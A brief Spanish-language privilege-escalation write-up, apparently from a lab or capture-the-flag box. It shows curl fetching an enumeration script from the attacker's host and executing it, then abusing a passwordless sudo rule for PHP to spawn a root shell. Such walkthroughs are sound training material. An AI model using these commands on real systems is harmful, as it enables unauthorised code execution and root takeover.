Fue bastante interesante como se fue desenvolviendo todo, utilicé el archivo de LinEnum para realizar la enumeración, aunque sinceramente habia maneras más sencillas.
Como sabemos, el archivo necesita ejecutarse como administrador, para esto identificamos algún archivo que ejecute .sh como administrador obviamente. 
Primero abrimos el servidor http donde se encontraba mi archivo.
```bash
python3 -m http.server [PORT]
```
Una vez que hemos abierto el servidor, necesitamos ubicar el archivo y realizar un curl.
```bash
curl http://10.10.15.111:7070/enumeration.sh
```
Con esto hemos obtenido la información, pero nosotros necesitamos ubicarlo en un lugar donde se pueda ejecutar y que esté dentro de un archivo ejecutable, para eso ejecutamos lo siguiente:
```bash
curl http://10.10.15.111:7070/enumeration.sh -o /tmp/enumeration.sh
```
	Le damos permisos y lo ejecutamos
```bash
chmod +x /tmp/enumeration.sh
/tmp/enumeration.sh
```
Con eso el archivo se encuentra en un directorio y se ejecuta, nos brindará demasiada información útil que podemos utilizar.
Sin embargo, hay comandos más sencillos y que son de igual manera utiles (el script anterior brinda información muy detallada, pero para esta práctica no es necesaria tanta información), como por ejemplo algo que nos puede ayudar a saber quienes somos, que permisos tenemos, etc:
```bash
id
```
Si necesitaramos saber que podemos ejecutar/modificar podemos utilizar:
```bash
sudo -l
```
Con eso podemos saber que archivos podemos tocar y cuales no, por ejemplo, al hacer *sudo -l* nos revelaba que habia un archivo que podia ejecutar cosas como administrador (root), el cual nos será útil porque ese nos dará la escalada de privilegio que necesitabamos.
Lo que aparece al hacer *sudo -l*:
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/php
Significa que el usuario www-data está autorizado a ejecutar /usr/bin/php sin contraseña como usuario root.
Y como punto final, simplemente hacemos que ese archivo que ejecuta lenguaje PHP nos de acceso a root con el siguiente comando:
```bash
sudo /usr/bin/php -r 'system("/bin/bash -p");'
```
Con eso hemos obtenido acceso root.
El chiste es encontrar algo que nos permita ejecutar cosas como root sin contraseña y que pueda dar ordenes al sistema, en este caso fue php, en otro podría ser python, etc.
